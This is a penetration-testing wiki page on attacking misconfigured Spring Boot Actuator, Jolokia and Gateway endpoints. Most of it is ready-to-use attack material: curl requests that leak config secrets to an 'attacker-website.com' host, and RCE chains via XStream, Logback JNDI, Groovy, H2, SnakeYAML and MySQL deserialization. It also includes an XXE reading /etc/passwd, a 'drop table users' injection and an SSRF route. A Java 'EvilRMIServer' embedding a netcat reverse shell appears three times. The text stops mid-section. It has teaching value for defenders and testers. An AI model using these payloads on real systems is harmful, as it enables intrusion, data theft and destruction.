# Spring Boot Actuators

## Theory

The Spring Boot Framework includes a number of features called actuators to help you monitor and manage your web application when you push it to production. Intended to be used for auditing, health, and metrics gathering, they can also open a hidden door to your server when misconfigured.

The following Actuator endpoints could potentially have security implications leading to possible vulnerabilities:

* /dump - displays a dump of threads (including a stack trace)
* /trace - displays the last several HTTP messages (which could include session identifiers)
* /logfile - outputs the contents of the log file
* /shutdown - shuts the application down
* /mappings - shows all of the MVC controller mappings
* /env - provides access to the configuration environment
* /actuator/env
* /restart - restarts the application
* /heapdump - Builds and returns a heap dump from the JVM used by our application

{% hint style="danger" %}
For Spring 1x, they are registered under the root URL, and in 2x they moved to the "/actuator/" base path.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Enumerate" %}
We may use the [spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) wordlist from SecList to fuzz actuators URLs

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
```
{% endtab %}
{% endtabs %}

### Env

[env](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#env) exposes properties from Spring's `ConfigurableEnvironment`. Exposition of this endpoint can lead to RCE or sensitive information leaks.&#x20;

{% hint style="danger" %}
Spring Boot 2.x uses `json` instead of `x-www-form-urlencoded` for property change requests via the `env` endpoint
{% endhint %}

{% hint style="danger" %}
Information returned by the `env` and `configprops` endpoints can be somewhat sensitive so keys matching a certain pattern are [sanitized](https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/howto-actuator.html#howto-sanitize-sensible-values) (replaced by `*`) by default. However, below you can find several ways to retrieve these values
{% endhint %}

<details>

<summary>eureka.client.serviceUrl.defaultZone</summary>

Exploiting`eureka.client.serviceUrl.defaultZone` requires the following conditions:

* `/refresh` endpoint is available
* An application uses `spring-cloud-starter-netflix-eureka-client` dependency

#### Retrieving env properties

You can get `env` property value in plaintext by first setting the `eureka.client.serviceUrl.defaultZone` to the following values

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "eureka.client.serviceUrl.defaultZone",
    "value": "http://value:${your.property.name}@attacker-website.com/"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name": "eureka.client.serviceUrl.defaultZone","value": "http://value:${your.property.name}@attacker-website.com/"}' http://<TARGET>/actuator/env
```

Then, refresh the configuration

```bash
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/refresh
```

#### XStream deserialization RCE

It requires `Eureka-Client` version `< 1.8.7`.

You can gain RCE by first setting up a website that responds with a malicious XStream payload using [springboot-xstream-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)

```bash
python springboot-xstream-rce.py
```

Then, set the `eureka.client.serviceUrl.defaultZone` property:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "eureka.client.serviceUrl.defaultZone",
    "value": "http://attacker-website.com/payload"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name": "eureka.client.serviceUrl.defaultZone","value": "http://attacker-website.com/payload"}' http://<TARGET>/actuator/env
```

Then, refresh the configuration, the code will be executed.

```bash
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/refresh
```

</details>

<details>

<summary>logging.config</summary>

Exploiting `logging.config` requires `/restart` to be available.

#### Logback JDNI RCE

`ogging.config` can lead to RCE via Logback JNDI, Check [reloadByURL - RCE](spring-boot-actuators.md#reloadbyurl-rce) for the full process of hosting LDAP/RMI rogue server. The exploit is similar.

First, open a simple HTTP server on the machine you control

```bash
python3 -m http.server 80
```

And host the logback configuration at `http://attacker-website.com/logback.xml`:  with the following content:

```markup
<configuration>
  <insertFromJNDI env-entry-name="rmi://attacker-website.com:1097/jndi" as="appName" />
</configuration>
```

Then the next step is to create a malicious RMI service:

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```

pom.xml to compile this project:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.springframework</groupId>
    <artifactId>RMIServer</artifactId>
    <version>0.0.1</version>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.0.0.RELEASE</version>
    </parent>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
    </dependencies>

    <properties>
        <java.version>1.8</java.version>
    </properties>

</project>
```

Run the compiled jar

```bash
java -jar RMIServer-0.1.0.jar
```

Set `logging.config` properties:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "logging.config",
    "value": "http://attacker-website.com/logback.xml"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name": "logging.config","value":"http://attacker-website.com/logback.xml"}' http://<TARGET>/actuator/env
```

Restart the application:

```bash
POST /actuator/restart HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/restart
```

#### Groovy RCE

First, host the `payload.groovy` file with the following content:

```bash
Runtime.getRuntime().exec("open -a Calculator")
```

Set logging.config:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "logging.config",
    "value": "http://attacker-website.com/payload.groovy"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://attacker-website.com/payload.groovy"}' http://<TARGET>/actuator/env
```

Restart the application:

```bash
POST /actuator/restart HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/restart
```

</details>

<details>

<summary>spring.main.sources</summary>

Exploiting `spring.main.sources` requires`/restart` to be available.

#### Groovy RCE

First, host the `payload.groovy` file with the following content:

```bash
Runtime.getRuntime().exec("open -a Calculator")
```

Set `logging.config`:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.main.sources",
    "value": "http://attacker-website.com/payload.groovy"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.main.sources","value":"http://attacker-website.com/payload.groovy"}' http://<TARGET>/actuator/env
```

Restart the application:

```bash
POST /actuator/restart HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/restart
```

</details>

<details>

<summary>spring.datasource.tomcat</summary>

#### validationQuery

`spring.datasource.tomcat.validationQuery` allows specifying any SQL query, that will be automatically executed against the current database. It could be any statement, including insert, update, or delete.

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.datasource.tomcat.validationQuery",
    "value": "drop+table+users"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.datasource.tomcat.validationQuery","value":"drop table users"}' http://<TARGET>/actuator/env
```

#### url

`spring.datasource.tomcat.url` allows modifying the current JDBC connection string.

The problem here is that when the application establishing the connection to the database is already running, just updating the JDBC string has no effect. But you can try using `spring.datasource.tomcat.max-active` to increase the number of simultaneous database connections.

Thus, you can change the JDBC connection string, increase the number of connections, and then send many requests to the application to simulate a heavy load. Under load, the application will create a new database connection with an updated malicious JDBC string.

```bash
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.datasource.tomcat.url","value":"jdbc:mysql://ATTACKING-IP:3001/testx1"}' http://<TARGET>/actuator/env
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.datasource.tomcat.max-active","value":"5"}' http://<TARGET>/actuator/env
```

</details>

<details>

<summary>spring.datasource</summary>

#### data

`spring.datasource.data` can be used to gain RCE if the following coditions are met:

* `/restart` is available
* `h2database` and `spring-boot-starter-data-jpa` dependencies are used

In order to exploit this endpoint, start a simple HTTP server on the machine you control

```bash
python3 -m http.server 80
```

And then, host the following `payload.sql` file

```sql
CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','open -a Calculator');
```

Note that te `T5` method in the payload must be renamed (to `T6`) after the command is executed before it can be recreated and used. Otherwise, the vulnerability will not trigger the next time an application is restarted.

Then, set the `spring.datasource.data`:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.datasource.data",
    "value": "http://attacker-website.com/payload.sql"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.datasource.data","value":"http://attacker-website.com/payload.sql"}' http://<TARGET>/actuator/env
```

Restart the application:

```bash
POST /actuator/restart HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/restart
```

#### url

`spring.datasource.url` is database connection string that is used only for the first connection. You can chain it with JDBC [**deserialization**](../../../web-vulnerabilities/server-side/deserialization/) vulnerability in MySQL to gain RCE. The vulnerability requires the following conditions:

* `/refresh` is available
* `mysql-connector-java` dependency is used

Note that changing `spring.datasource.url` will temporarily disable all normal database services

To exploit, use the `/actuator/env` endpoint to fetch the next values:

* `mysql-connector-java` version number (5.x or 8.x)
* Common deserialization gadgets, such as `commons-collections`
* `spring.datasource.url` value to facilitate later crafting of its normal JDBC URL

Create a payload with [ysoserial](https://github.com/frohoff/ysoserial)

```bash
java -jar ysoserial.jar CommonsCollections3 calc > payload.ser
```

Use [springboot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) to host `payload.ser`

Set the `spring.datasource.url` property:\
`mysql-connector-java` version 5.x:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.datasource.url",
    "value":"jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.datasource.url","value":"jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"}' http://<TARGET>/actuator/env
```

`mysql-connector-java` version 8.x:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.datasource.url",
    "value":"jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.datasource.url","value":"jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"}' http://<TARGET>/actuator/env
```

Refresh the configuration:

```bash
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/refresh
```

Finally, try to access an endpoint that will trigger a database query, for example `/product/list`, or find other ways to query the database and trigger the vulnerability

</details>

<details>

<summary>spring.cloud.bootstrap.location</summary>

Exploiting `spring.cloud.bootstrap.location` requires the following conditions:

* `/refresh` endpoint is available
* `spring-cloud-starter` version `< 1.3.0.RELEASE`

#### Retrieving env properties

You can get `env` property value in plaintext by starting a webserver and setting the `spring.cloud.bootstrap.location` property as follow:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.cloud.bootstrap.location",
    "value": "http://attacker-website.com/?=${your.property.name}"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.cloud.bootstrap.location","value":"http://attacker-website.com/?=${your.property.name}"}' http://<TARGET>/actuator/env
```

Refresh the configuration:

```bash
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/refresh
```

Retrive the property value from `attacker-website.com` logs

#### SnakeYML RCE

`spring.cloud.bootstrap.location` allows loading an external config in YAML format. You can gain code execution with the next steps:

Host `config.yml` at `http://attacker-website.com/config.yml` with the following content:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-website.com/payload.jar"]
  ]]
]
```

Host `payload.jar` with the code that will be executed, check [marshalsec](https://github.com/mbechler/marshalsec) and [yaml-payload](https://github.com/artsploit/yaml-payload) for how to prepare the payload

Set the `spring.cloud.bootstrap.location` property:

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.cloud.bootstrap.location",
    "value": "http://attacker-website.com/yaml-payload.yml"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"name":"spring.cloud.bootstrap.location","value":"http://attacker-website.com/yaml-payload.yml"}' http://<TARGET>/actuator/env
```

Refresh the configuration and code will be executed:

```bash
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/refresh
```

</details>

<details>

<summary>spring.datasource.hikari.connection-test-query</summary>

`spring.datasource.hikari.connection-test-query` sets a query that will be executed before granting a connection from a pool. It can lead to RCE if the following conditions are met:

* `/restart` endpoint is available
* `com.h2database.h2` dependency is used

You can gain code execution by setting the `spring.datasource.hikari.connection-test-query` property

```bash
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
    "name": "spring.datasource.hikari.connection-test-query",
    "value": "CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');\"}" http://<TARGET>/actuator/env
```

The `T5` method in the payload must be renamed (to `T6`) after the command is executed before it can be recreated and used. Otherwise, the vulnerability will not trigger the next time an application is restarted.

Restart the application:

```bash
POST /actuator/restart HTTP/1.1
Content-Type: application/json

#Or curl command
curl -X POST -H "Content-Type: application/json" http://<TARGET>/actuator/restart
```

</details>

### Jolokia

If the Jolokia Library is in the target application classpath, it is automatically exposed by Spring Boot under the `/jolokia` actuator endpoint. Jolokia allows HTTP access to all registered MBeans and is designed to perform the same operations you can perform with JMX. It is possible to list all available **MBeans actions** using the URL:

```bash
http://<TARGET>/jolokia/list
http://<TARGET>/actuator/jolokia/list
```

<details>

<summary>Extract env properties</summary>

You can invoke relevant MBeans to retrive `env` property values in plaintext. Below you can find MBeans that can be used for this purpose. However, the situation may differ and the Mbeans listed may not be available. However, you can search methods that can be called by keywords like `getProperty`.

#### org.springframework.boot

You can get `env` property value in plaintext using the following request:

```bash
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{
    "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
    "operation": "getProperty",
    "type": "EXEC",
    "arguments": [
        "your.property.name"
    ]
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"mbean":"org.springframework.boot:name=SpringApplication,type=Admin","operation":"getProperty","type":"EXEC","arguments":["your.property.name"]}' http://<TARGET>/actuator/jolokia
```

#### org.springframework.cloud.context.environment

You can get `env` property value in plaintext using the following request:

```bash
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{
    "mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
    "operation": "getProperty",
    "type": "EXEC",
    "arguments": [
        "your.property.name"
    ]
}

#Or curl command
curl -X POST -H "Content-Type: application/json" -d '{"mbean":"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation":"getProperty","type":"EXEC","arguments":["your.property.name"]}' http://<TARGET>/actuator/jolokia
```

</details>

<details>

<summary>reloadByURL - XXE</summary>

The `reloadByURL` action, provided by the Logback library, allows us to reload the logging **XML config file** from an external URL

If the action `reloadByURL` exists, the logging configuration can be reload from an external URL. You can exploit this feature to trigger an Out-Of-Band XXE.

Host the logback.xml configuration and file.dtd at `http://attacker-website.com/`:

```xml
# file logback.xml from the server attacker-website
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://attacker-website/file.dtd">%remote;%int;]>
<a>&trick;</a>
```

```xml
# file file.dtd from the server attacker-website
<!ENTITY % d SYSTEM "file:///etc/passwd"> 
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

the logging configuration can be reload from our server by requesting following URL:

```bash
curl http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml
```

</details>

<details>

<summary>reloadByURL - RCE</summary>

The `reloadByURL` action, provided by the Logback library, allows us to reload the logging **XML config file** from an external URL

In the XML file, we can include a tag like `<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />` and the name attribute will be passed to the DirContext.lookup() method. If we can supply an arbitrary name into the .lookup() function, we don't even need XXE or HeapDump because it gives us a full **Remote Code Execution**.

#### JDK > 1.8.0\_191

Open a simple HTTP server on the machine you control

```bash
python3 -m http.server 80
```

And host the logback configuration at `http://attacker-website.com/logback.xml`:

```xml
# file logback.xml from the server attacker-website
<configuration>
  <insertFromJNDI env-entry-name="rmi://attacker-website.com:1097/jndi" as="appName" />
</configuration>
```

Then the next step is to create a malicious RMI service:

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```

pom.xml to compile this project:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.springframework</groupId>
    <artifactId>RMIServer</artifactId>
    <version>0.0.1</version>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.0.0.RELEASE</version>
    </parent>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
    </dependencies>

    <properties>
        <java.version>1.8</java.version>
    </properties>

</project>
```

Run the compiled jar

```bash
java -jar RMIServer-0.1.0.jar
```

The logging configuration can be reload from our server by requesting following URL:

```bash
curl http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml
```

#### JDK < 1.8.0\_191

Open a simple HTTP server on the machine you control

```bash
python3 -m http.server 80
```

and host the logback configuration at `http://attacker-website.com/logback.xml`:

```xml
# file logback.xml from the server attacker-website
<configuration>
    <insertFromJNDI env-entry-name="ldap://attacker-website.com:1389/JNDIObject" as="appName" />
</configuration>
```

Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java). Compile it such a way that it is compatible with earlier JDK versions:

```bash
# Compile it 
javac -source 1.5 -target 1.5 JNDIObject.java
```

Then copy the generated `JNDIObject.class`file to the root directory of the `http://attacker-website.com` website**.**

Set up LDAP server, use [marshalsec](https://github-com.translate.goog/mbechler/marshalsec?\_x\_tr\_sl=auto&\_x\_tr\_tl=en&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp) to set up the server:

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker-website.com:80/#JNDIObject 1389
```

The logging configuration can be reload from our server by requesting following URL:

```bash
curl http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml
```

If an application successfully requests `logback.xml` and `marshalsec` receives the target request, but an application does not request `JNDIObject.class`, it is likely that an application's JDK version is too high, causing JNDI usage to fail.

</details>

<details>

<summary>createJNDIRealm - RCE</summary>

One of the MBeans of Tomcat (embedded into Spring Boot) is `createJNDIRealm`. `createJNDIRealm` allows creating JNDIRealm that is vulnerable to JNDI injection. You can expoit with the next steps:

Get the `/jolokia/list` or `/actuator/jolokia/list` to check if `type=MBeanFactoryand` and `createJNDIRealm` are in place

```bash
curl https://<TARGET>/actuator/jolokia/list | grep 'createJNDIRealm'
```

#### JDK > 1.8.0\_191

Open a simple HTTP server on the machine you control

```bash
python3 -m http.server 80
```

Then the next step is to create a malicious RMI service:

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```

pom.xml to compile this project:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.springframework</groupId>
    <artifactId>RMIServer</artifactId>
    <version>0.0.1</version>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.0.0.RELEASE</version>
    </parent>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
    </dependencies>

    <properties>
        <java.version>1.8</java.version>
    </properties>

</project>
```

Run the compiled jar

```bash
java -jar RMIServer-0.1.0.jar
```

Modify the target address, RMI address, port and other information in the [springboot-realm-jndi-rce.py](https://translate.google.com/website?sl=auto\&tl=en\&hl=en\&client=webapp\&u=https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) script according to the actual situation , and then run it on the server you control.

```bash
#Start listener
nc -lvnp 443

#Exploit (JNDIObject = jndi)
python springboot-realm-jndi-rce.py
```

#### JDK < 1.8.0\_191

Open a simple HTTP server on the machine you control

```bash
python3 -m http.server 80
```

Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java). Compile it such a way that it is compatible with earlier JDK versions:

```bash
# Compile it 
javac -source 1.5 -target 1.5 JNDIObject.java
```

Then copy the generated `JNDIObject.class`file to the root directory of the `http://attacker-website.com` website**.**

Set up RMI server, use [marshalsec](https://github-com.translate.goog/mbechler/marshalsec?\_x\_tr\_sl=auto&\_x\_tr\_tl=en&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp) to set up the server:

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://attacker-website.com:80/#JNDIObject 1389
```

The we wan send the payload by editing the target address, RMI address, port and other information in the [springboot-realm-jndi-rce.py](https://translate.google.com/website?sl=auto\&tl=en\&hl=en\&client=webapp\&u=https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) script according to the actual situation , and then run it on the server you control.

```bash
#Start listener
nc -lvnp 443

#Exploit
python springboot-realm-jndi-rce.py
```

</details>

### gateway

The [gateway](https://cloud.spring.io/spring-cloud-gateway/reference/html/#actuator-api) actuator endpoint lets you monitor and interact with a Spring Cloud Gateway application. In other words, you can define routes for the application and use `gateway` actuator to trigger requests according to these routes.

Routes can provide access to hidden or internal endpoints, which can be misconfigured or vulnerable. You can fetch all available routes via `GET`-request to `/actuator/gateway/routes`.

<details>

<summary>SSRF</summary>

If [adding routes](https://cloud.spring.io/spring-cloud-gateway/reference/html/#creating-and-deleting-a-particular-route) do not require administrative permissions. The next request will create a route to localhost:

```http
POST /actuator/gateway/routes/new_route HTTP/1.1
Content-Type: application/json

{
"predicates": [
    {
    "name": "Path",
    "args": {
        "_genkey_0": "/new_route/**"
    }
    }
],
"filters": [
    {
    "name": "RewritePath",
    "args": {
        "_genkey_0": "/new_route(?<path>.*)",
        "_genkey_1": "/${path}"
    }
    }
],
"uri": "https://localhost",
"order": 0
}
```

Send refresh request to apply new route:

```http
POST /actuator/gateway/refresh HTTP/1.1
Content-Type: application/json

{
    "predicate": "Paths: [/new_route], match trailing slash: true",
    "route_id": "new_route",
    "filters": [
        "[[RewritePath /new_route(?<path>.*) = /${path}], order = 1]"
    ],
    "uri": "https://localhost",
    "order": 0
}
```

</details>

<details>

<summary>SpEL Injection</summary>

Applications using Spring Cloud Gateway in the version prior to `3.1.0` and `3.0.6`, are vulnerable to [CVE-2022-22947](https://spring.io/security/cve-2022-22947)  that leads to a [SpEL injection](spring-boot-actuators.md#spel-injection) attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.

You may check this links for more details:&#x20;

[https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg](https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg)

[https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947)

[https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/](https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/)

</details>

### trace or httptrace

Displays HTTP trace information (by default, the last 100 HTTP request-response exchanges). It may disclose details about requests of internal applications as well as user cookies and JWT tokens.

`trace` requires an `HttpTraceRepository` bean.

```bash
curl http://<TARGET>/actuator/httptrace -i -X GET
curl http://<TARGET>/actuator/trace -i -X GET
```

### h2-console

<details>

<summary>RCE</summary>

To exploit, it requires the following conditions:

* `com.h2database.h2` dependency is used
* h2 console is enabled in Spring configuration `spring.h2.console.enabled=true`

You can gain RCE via JDNI in h2 database console:

